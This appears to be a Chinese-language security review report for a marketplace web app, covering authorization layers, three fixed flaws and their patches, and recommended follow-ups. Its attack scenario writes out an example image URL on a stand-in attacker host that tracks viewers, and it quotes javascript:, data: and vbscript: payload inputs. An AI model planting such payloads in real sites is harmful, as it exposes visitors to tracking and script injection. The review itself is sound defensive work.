# 安全性審查報告（2026-04-28）

> 本文件記錄 2026-04-28 對全站架構的安全性審查、發現的問題、以及已套用的修正。

---

## 一、整體架構與防禦層

### API 進入點

| 路徑 | 對外可達 | 防禦機制 |
|------|----------|----------|
| `/api/trpc/[trpc]` | ✅ 公開 | 每個 procedure 透過 tRPC middleware 守門（見下） |
| `/api/cron/expire-listings`、`/api/cron/expire-connections` | ✅ 公開 | `Authorization: Bearer <CRON_SECRET>`，constant-time 比對 |
| `/api/auth/instagram/{connect,callback}` | ✅ 公開 | OAuth state cookie + 二次 `getUser()` 驗證 |
| `/api/auth/threads/{connect,callback}` | ✅ 公開 | 同上 |
| Supabase REST/Realtime（`*.supabase.co`） | ✅ 公開（anon key） | RLS policy（`00008` + `00009`） |
| Cloudflare R2 | ❌ 僅 server | 短效 presigned URL（10 分鐘） |

### tRPC 授權層（`server/trpc.ts`）

每個 procedure 一定要選擇下面其中一種：

- `publicProcedure` — 任何人皆可呼叫（瀏覽商品、搜尋等讀取場景）
- `protectedProcedure` — 必須登入；middleware 強制要求 `ctx.user`，否則 `UNAUTHORIZED`
- `sellerProcedure` — 額外查 `sellers` 表，必須是賣家且未停權，否則 `FORBIDDEN`
- `adminProcedure` — 檢查 JWT 的 `app_metadata.role === 'admin'`；`app_metadata` 只有 service role 寫得到

身分驗證來源是 `supabase.auth.getUser()`，會打 Supabase 後端驗 JWT 簽章，**偽造 cookie 會被丟棄**。

### Supabase RLS

- 所有業務表都啟用 RLS，policy 定義在 `supabase/migrations/00008_add_profiles_rls.sql` 與 `00009_add_rls_policies_all_tables.sql`。
- 寫入一律以 `auth.uid() = owner_id` 為條件。
- `social_tokens` 表**完全不開** anon / authenticated policy，只有 service role 可存取。
- tRPC 後端使用 `SUPABASE_SERVICE_ROLE_KEY`（`server/db/client.ts`）會 bypass RLS — 這是設計如此，授權責任**完全壓在 tRPC procedure 層**。

### 加密儲存

- OAuth access token（Instagram / Threads）以 AES-256-GCM 加密後存入 `social_tokens.access_token`，金鑰來自 `SOCIAL_TOKEN_ENCRYPTION_KEY`（`lib/utils/social-tokens.ts`）。

---

## 二、本次審查發現的問題

### 🔴 Vuln 1（已修）— 圖片 URL / r2_key 注入

**檔案**：`server/routers/upload.ts`

**問題**：`confirmProductImage`、`confirmListingImages`、`confirmConnectionImages` 三條 mutation 在驗證父層資源（product / listing / connection）的所有權之後，把使用者送進來的 `r2_key` 與 `url` / `thumbnail_url` 直接寫入 DB，僅做 `z.string()` 與 `z.string().url()` 驗證。沒有檢查：

1. `r2_key` 是否落在 `images/<purpose>/users/<ctx.user.id>/...`
2. `url` host 是否為 R2（`R2_PUBLIC_URL` / `*.r2.dev`）

**攻擊場景**：登入者建立自己的 product / listing / connection 後，呼叫對應 confirm endpoint，送 `url: "https://attacker.com/track.png?u=<viewerId>"` 或他人 R2 路徑。所有觀看該頁面的使用者瀏覽器都會直接從 attacker.com 拉圖（IP / UA / referrer 外洩、可隨時抽換為釣魚或攻擊性圖片，亦可冒用他人圖片）。前端用了 `<img src={...}>`（`components/connection/connection-card.tsx`、`shared/image-gallery.tsx`、`shared/image-lightbox.tsx`、`product/listing-comparison.tsx`），不受 `next.config.ts` `images.remotePatterns` 保護。

**修正**：新增兩個 helper：

- `assertOwnedR2Key(r2Key, purpose, userId)` — 強制 `images/<purpose>/users/<userId>/` 前綴並擋掉 `..`
- `assertUrlMatchesKey(url, r2Key)` — 強制 `url === \`${R2_PUBLIC_URL}/${r2Key}\``

接到三條 confirm mutation 上，並把 `r2_key` schema 收緊為 `z.string().min(1).max(500)`。`deleteObjects` 同步加上 `..` 阻擋。

### 🟡 Vuln 2（已修）— `z.string().url()` 接受 `javascript:` / `data:` 等非 http schema

**檔案**：`lib/validators/listing.ts`、`lib/validators/seller.ts`、`server/routers/auth.ts`

**問題**：`post_url`、`avatar_url` 都用 `z.string().url()`，zod 用 `new URL()` 驗證會放行 `javascript:alert(1)`、`data:text/html,...`、`vbscript:`。`post_url` 在 `app/(buyer)/listings/[id]/page.tsx:107` 渲染為 `<a href={listing.post_url} target="_blank">`。雖然現代瀏覽器會擋頂層導頁的 `javascript:`，但屬於不該被允許儲存的輸入。

**修正**：在 `lib/validators/common.ts` 新增共用驗證：

```ts
export const httpUrl = z
  .string()
  .url()
  .refine((u) => /^https?:\/\//i.test(u), { message: '只允許 http(s) 連結' })
```

套用到所有使用者輸入的 URL 欄位：

- `lib/validators/listing.ts` — `post_url`（create / update / publish）
- `lib/validators/seller.ts` — `avatar_url`（becomeSeller / updateSeller）
- `server/routers/auth.ts` — `avatar_url`（completeOnboarding / updateProfile）

### 🟢 Vuln 3（已修）— Cron secret 字串比對為非 constant-time

**檔案**：`app/api/cron/expire-listings/route.ts`、`app/api/cron/expire-connections/route.ts`

**問題**：原本以 `authHeader !== \`Bearer ${process.env.CRON_SECRET}\`` 比對，理論上有 timing attack 可能（實務上對遠端 HTTP 不可行，但屬於 best practice 補強）。

**修正**：改用 `crypto.timingSafeEqual`，並先比對長度避免 throw。

```ts
function isAuthorizedCron(authHeader: string | null): boolean {
  const expected = `Bearer ${process.env.CRON_SECRET ?? ''}`
  if (!authHeader || authHeader.length !== expected.length) return false
  return timingSafeEqual(Buffer.from(authHeader), Buffer.from(expected))
}
```

---

## 三、已驗證但未發現問題的面向

| 面向 | 結論 |
|------|------|
| SQL injection | Supabase JS client 全程用參數化查詢；`search_products` / `search_product_ids` RPC 用 plpgsql + `||` 字串拼接，但所有參數都是函式參數而非 SQL 拼接，安全 |
| SSRF | 所有 server-side `fetch` 的 host 都是寫死的（graph.instagram.com、graph.threads.net），無使用者控制 |
| Open redirect | `getSafeNextPath`（`lib/supabase/auth-error.ts:13`）拒絕 `//` 開頭與非 `/` 路徑 |
| OAuth CSRF | Instagram / Threads connect 都產生隨機 `state` 並寫入 httpOnly cookie，callback 嚴格比對 |
| OAuth token 外洩 | Token 用 AES-256-GCM 加密存 DB；query string 形式僅用於 server-to-server HTTPS 呼叫 Meta，不寫 log |
| Service role key 外洩 | 僅存在 `process.env.SUPABASE_SERVICE_ROLE_KEY`（server-only），未進入任何 client bundle |
| XSS（React 渲染） | 沒有 `dangerouslySetInnerHTML`；所有 user input 透過 React text node 渲染（自動 escape） |
| Supabase anon key 暴露 | 預期行為（前端必須使用），實際防禦由 RLS 提供 |
| Path traversal in R2 keys | R2/S3 不會解析 `..`，但已加 defense-in-depth 阻擋 |

---

## 四、未處理但建議列入後續工作

### 1. Rate limiting

目前沒有任何 rate limit。攻擊者可用合法帳號狂打 tRPC endpoint，特別值得補的：

- `auth.checkUsername`（publicProcedure，可用於 username 枚舉）
- `auth.getSession`、`product.search`、`product.browse`
- 寫入類 mutation（避免合法帳號狂建 brand / product / report）

建議：在 Vercel middleware 或 tRPC middleware 接 [Upstash Ratelimit](https://github.com/upstash/ratelimit) 或 Vercel KV。

### 2. Service-role 全有全無風險

`server/db/client.ts` 的 `getDb()` bypass 全部 RLS。**只要任何一支新 procedure 漏寫 `protectedProcedure` 或漏檢查 `seller_id === ctx.user.id`，就直接通到底**。

建議：

- 新增 procedure 時嚴格 code review。
- 長期可考慮把純查詢 procedure 切換到「使用者 anon key + JWT」走 RLS，減少爆破半徑。

### 3. 圖片 URL 一致性的 DB 端強制

目前 URL 與 r2_key 的一致性檢查只在 tRPC 層。可在 DB 加 CHECK constraint 或 trigger，要求 `url` host 屬於 R2 白名單，作為 defense-in-depth。

### 4. Phone verification

`sellers.phone_verified` 預設 `true`（`server/routers/seller.ts:28` `// TODO: implement OTP verification`）。電話號碼目前未驗證，影響賣家身分可信度（不是直接安全漏洞，但屬於信任面）。

---

## 五、回答常見疑問

> **「別人沒辦法隨意 call 我的 API 對吧？」**

正確說法是：**任何人都能 call，但會被授權層擋下**。

- tRPC endpoint 公開可達（瀏覽器要用），但 protected / seller / admin procedure 沒有合法 session 一律拒絕。
- Cron endpoint 沒有 `CRON_SECRET` 直接 401。
- 寫入 DB 的路徑全都要過 `protectedProcedure` 以上的守門，且 `ctx.user.id` 來自 server 端驗過簽章的 JWT，無法偽造。
- Supabase anon key 雖然在前端可見，但所有寫入都被 RLS 鎖到 `auth.uid() = owner_id`。
- R2 presigned URL 短效（10 分鐘）且綁定 user prefix。

**結論**：身分驗證、授權、加密儲存、CSRF 防禦都到位。短期最值得補的是 rate limiting；長期紀律是新 procedure 的 review。

---

## 六、修改的檔案清單

- `server/routers/upload.ts` — 新增 `assertOwnedR2Key` / `assertUrlMatchesKey`，套用到三條 confirm mutation；`deleteObjects` 加 `..` 阻擋
- `lib/validators/common.ts` — 新增 `httpUrl` helper
- `lib/validators/listing.ts` — `post_url` 改用 `httpUrl`
- `lib/validators/seller.ts` — `avatar_url` 改用 `httpUrl`
- `server/routers/auth.ts` — `avatar_url` 改用 `httpUrl`
- `app/api/cron/expire-listings/route.ts` — 改 `crypto.timingSafeEqual`
- `app/api/cron/expire-connections/route.ts` — 改 `crypto.timingSafeEqual`
